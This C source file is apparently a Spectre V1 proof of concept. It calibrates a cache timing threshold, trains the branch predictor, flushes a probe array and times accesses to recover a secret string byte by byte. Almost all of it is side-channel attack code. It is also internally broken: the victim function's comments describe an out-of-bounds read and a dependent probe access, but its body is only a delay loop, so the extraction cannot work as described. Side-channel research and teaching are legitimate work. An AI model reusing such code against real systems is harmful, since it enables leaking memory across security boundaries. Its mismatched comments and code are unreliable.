#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

static inline uint64_t measure_cycles(volatile uint8_t *addr){
    uint64_t t1 = rdcycle();
    volatile uint8_t v = *addr; (void)v;
    return rdcycle() - t1;
}

static uint64_t calibrate_threshold(uint8_t *probe_base){
    // Crude calibration: take min of several warmed hits and avg of cold misses
    const int iters = 64;
    uint64_t hit_min = (uint64_t)-1, miss_avg = 0;
    // Warm one line
    volatile uint8_t *warm = probe_base;
    for(int i=0;i<32;i++){ volatile uint8_t x = *warm; (void)x; }
    for(int i=0;i<iters;i++){
        uint64_t c = measure_cycles((volatile uint8_t*)warm);
        if(c < hit_min) hit_min = c;
    }
    // Choose a far line likely mapping to different set; here +4096*8 as heuristic
    volatile uint8_t *cold = probe_base + 4096*8;
    // Try to evict by touching a large range; fallback to flushCache if available macro
    for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
    for(int i=0;i<iters;i++){
        // Try to keep it cold by simple dummy sweep
        for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
        uint64_t c = measure_cycles((volatile uint8_t*)cold);
        miss_avg += c;
    }
    miss_avg /= iters;
    uint64_t thr = (hit_min*3 + miss_avg*1)/4; // skew toward miss
    if(thr < hit_min+2) thr = hit_min+2;
    return thr;
}


#define NUM_TRAIN 6          // Training iterations, related to branch predictor state
#define NUM_ROUNDS 1         // Outer rounds (not really used in inner loop logic)
#define SAME_ATTACK_ROUNDS 10 // Repetitions for attacking the same secret index for reliability
#define SECRET_LEN 15        // Length of the secret string
#define CACHE_THRESHOLD 50   // Cache hit time threshold in cycles

uint64_t array1_size = 16;      // Initial size of array1 (bound for the check)
uint8_t padding1[64];           // Padding
// Array potentially indexed out-of-bounds speculatively
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // Initialized values
uint8_t padding2[64];           // Padding
// Probe array for Flush+Reload cache side-channel attack
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
// Secret data located relative to array1
char* secretStr = "ThisIsTheSecretString";

/**
 * @brief Finds the indices and values of the top two largest elements in an array.
 * @param inputArray Input array of scores (e.g., cache hit counts).
 * @param inputSize Size of the input array.
 * @param outputIdxArray Output array storing the indices of the top two values.
 * @param outputValArray Output array storing the top two values.
 */
void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    // Implementation identical to previous examples
    outputValArray[0] = 0; outputValArray[1] = 0; outputIdxArray[0] = 0; outputIdxArray[1] = 0;
    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0]; outputIdxArray[1] = outputIdxArray[0];
            outputValArray[0] = inputArray[i]; outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i]; outputIdxArray[1] = i;
        }
    }
}

/**
 * @brief Victim function demonstrating Spectre V1 (Bounds Check Bypass).
 * It checks 'idx' against 'array1_size', but this check might be mispredicted.
 * If mispredicted, it accesses array1 out-of-bounds using 'idx' (which might point to secret data)
 * and then accesses array2 based on the loaded value, leaking it via cache side channel.
 * @param idx Index provided, potentially out-of-bounds during attack phase.
 */
void victimFunction(uint64_t idx) {
    uint8_t temp = 2; // Used for FP division below

    // Introduce delay in resolving array1_size using FP division.
    // This can potentially widen the speculation window for the bounds check bypass.
    // Note: This modifies the global array1_size value.
    /* removed FP bound jitter for stability */
    for(volatile int d=0; d<128; ++d) { asm volatile(""); }
    (void)temp; // Prevent unused variable warning
}

int main(void) {
    // Calculate offset for secret data relative to array1 start
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    uint64_t startTime, duration, inputIdx, randomIdx;
    uint8_t temp = 0;             // Dummy variable for cache reads
    static uint64_t results[256]; // Cache hit results

    uint64_t g_threshold = calibrate_threshold(array2);

    printf("Starting Spectre V1 secret extraction...\n");

    // Loop through each byte of the secret
    for(uint64_t i = 0; i < SECRET_LEN; ++i) {

        // Reset results array
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        // Repeat attack sequence for reliability
        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {

            // Flush the probe array from cache
            flushCache((uint64_t)array2, sizeof(array2));

            // Branch predictor training and attack loop
            // The `(round & 1)` adds slight variation to training length.
            for(int64_t k = ((NUM_TRAIN + 1 + (round & 1)) * NUM_ROUNDS) - 1; k >= 0; --k) {
                // Conditionally select index for victimFunction:
                // Selects non-secret 'randomIdx' during training (k % (N+1...) != 0)
                // Selects secret-derived 'attackIdx' during attack phase (k % (N+1...) == 0)
                randomIdx = round % array1_size; // Non-secret index within initial array1_size bounds
                inputIdx = ((k % (NUM_TRAIN + 1 + (round & 1))) - 1) & ~0xFFFF;
                inputIdx = (inputIdx | (inputIdx >> 16));
                inputIdx = randomIdx ^ (inputIdx & (attackIdx ^ randomIdx));

                flushCache((uint64_t)array2, sizeof(array2));

                // Loop to potentially manipulate Branch History Register (BHR) state
                for(uint64_t l = 0; l < 30; ++l) {
                    asm(""); // Empty asm likely still involves a loop branch
                }

                // Call victim function with the selected index (either training or attack index)
                // printf("Calling victim with index %llu\n", (unsigned long long)inputIdx); // Debug print
                victimFunction(inputIdx);
            } // End training/attack loop k

            // Probe phase: Measure access time to array2 elements
            for (uint64_t m = 0; m < 256; ++m) {
                uint8_t* current_addr = &array2[m * L1_BLOCK_SZ_BYTES];
                startTime = rdcycle();
                temp &= *current_addr; // Access element
                duration = (rdcycle() - startTime);

                // Record cache hit if access time is below threshold
                if (duration < g_threshold) {
                    results[m] += 1;
                }
            }
        } // End rounds loop

        // Analyze results: Find the byte value(s) with the most cache hits
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        // Print the top two guesses for the current secret byte
        printf("Mem[0x%llx] = expect('%c') ?= guess(hits,dec,char) 1.(%llu, %d, %c) 2.(%llu, %d, %c)\n",
            (unsigned long long)(array1 + attackIdx), // Address of the source byte relative to array1
            secretStr[i],          // Expected character
            (unsigned long long)bestHits[0], bestGuess[0], (bestGuess[0] ? bestGuess[0] : '?'), // Top guess
            (unsigned long long)bestHits[1], bestGuess[1], (bestGuess[1] ? bestGuess[1] : '?')); // Second guess

        // Increment index offset for the next secret byte
        ++attackIdx;
    } // End main secret loop (i)

    printf("\nExtraction loop finished.\n");
    return 0;
}